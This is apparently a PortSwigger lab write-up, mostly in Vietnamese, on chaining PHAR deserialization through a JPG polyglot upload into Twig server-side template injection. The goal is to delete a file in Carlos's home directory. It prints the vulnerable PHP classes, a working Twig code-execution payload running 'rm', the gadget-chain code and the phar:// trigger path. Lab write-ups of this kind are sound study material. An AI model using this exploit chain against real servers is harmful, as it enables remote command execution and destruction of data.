# Target Goal: 

To solve the lab, delete the morale.txt file from Carlos's home directory.

# Recon: 

Sau khi login, ta sẽ có session được cung cấp không có gtri gì

Kiểm tra các feature có trên trang web, trong đó có 1 gói sau khi upload avt, path này dẫn đến nơi chứa avt khi upload lên:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/8a609072-5c0c-45d3-a901-034db7eb1d64)

Truy cập vào ta có được không chỉ avt mà còn cả source code:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/1107c3d8-12dd-4517-9d83-50a59f541697)

Chúng ta biết rằng trang web này có sử dụng PHAR deserialization và đoạn sourcode tra về có sử dụng các hàm  file_exists, file_get_content. 

Như đã biết thì trang web có chức năng upload ảnh nhưng chỉ check magic bytes (file signature) -> Mình có thể sử chèn payload vào phía sau magic bytes để đảm bảo file hợp lệ nhưng vẫn giữ được chức năng ban đầu (kĩ thuật polygot).
```
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

Tiếp theo đến với file Blog.php:

Ở đây có $this->desc được truyền vào dữ liệu thông qua tham số index mà không qua bất kì validation nào -> Có thể chèn payload SSTI

Template engine được sử dụng và Twig và ta cần thực hiện lệnh OS để xóa file ->  Cần tìm cách exploit SSTI Twig Code Execution

```
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```
[Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig---code-execution) cần để thực hiện:
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```

Cuối cùng là sử dụng tool này Polygot để file có định dạng jpg phù hợp với yêu cầu upload. [here](https://github.com/kunte0/phar-jpg-polyglot)

```
// our payload
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}";
$blog->user = 'user';
$object->template_file_path = $blog;
```
![image](https://github.com/vanniichan/Portswigger/assets/112863484/a150d267-34e7-46db-8da2-09f927bdd14c)

Lệnh để bắt đầu dùng tool: ` php -c php.ini phar_jpg_polyglot.php `

Upload file `out.jpg`:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/9ba773d6-d7ea-4d3b-8217-6f949d45c8a7)

file sẽ được lưu ở `cgi-bin/avatar.php?avatar=wiener`

![image](https://github.com/vanniichan/Portswigger/assets/112863484/85f71c30-9fc5-46be-903f-a77c413949cf)

Tuy lưu trữ nhưng file lại chưa được trigger nên ta phải trigger nó bằng path `/cgi-bin/avatar.php?avatar=phar://wiene`

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/3986f2f0-15bf-46e5-b8b9-e236c98d664f)
